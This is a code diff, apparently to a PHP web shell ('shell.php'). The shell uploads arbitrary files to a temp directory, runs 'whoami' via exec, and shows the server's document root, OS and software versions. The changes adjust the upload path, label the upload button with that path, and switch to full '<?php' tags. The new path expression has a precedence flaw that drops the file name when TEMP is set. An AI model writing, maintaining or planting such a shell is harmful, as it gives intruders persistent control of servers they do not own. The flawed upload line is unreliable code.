@@ -9,7 +9,7 @@
         else if(isset($_FILES['file']['tmp_name']))
         {
             $name = basename($_FILES['file']['name']);
-            if(move_uploaded_file($_FILES['file']['tmp_name'], "/tmp/" . basename($_FILES['file']['name']))) 
+            if(move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp" . "/" . basename($_FILES['file']['name']))) 
             {
                 echo "<textarea style='color:white;'>$name: Success!</textarea>";
             }
@@ -230,7 +230,7 @@ function fileUploadBox() {
   uploadDiv.setAttribute("align","center");
   uploadDiv.id="upload_box";
   uploadDiv.className = "popup"; 
-  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload!' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='shell.php' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
+  uploadDiv.innerHTML="<form id='file_upload' method='post' enctype='multipart/form-data' target='uploader'><input name='file' id='file' type='file' /><br /><input type='submit' name='action' value='Upload to <?php echo htmlentities($_SERVER['TEMP']?$_SERVER['TEMP']:"/tmp"); ?>' style='border:1px solid white;'/><br /><iframe name='uploader' id='uploader' src='shell.php' width='0' height='0' style='display:none;'></iframe></form><button name='close_button' class='button' type='button' style='height:3em;width:30%;' onclick='var element = document.getElementById(\"upload_box\"); element.parentNode.removeChild(element);' readonly=true>Close!</button>";
   document.body.appendChild(uploadDiv);
    
 }
@@ -249,7 +249,7 @@ function fileUploadBox() {
 <div class="push"></div>
 </div>
 <textarea name="info" class="info" readonly=true>
-<? 
+<?php 
 exec("whoami",$who);
 $pwd=$_SERVER["DOCUMENT_ROOT"];
 $sys=PHP_OS . ", " .$_SERVER['SERVER_SOFTWARE']. ", " . phpversion();
@@ -258,6 +258,6 @@ echo "user: $who[0]\tlocation: $pwd\tsystem: $sys";
 </textarea>
 </body>
 </html>
-<?
+<?php
 	}
 ?>
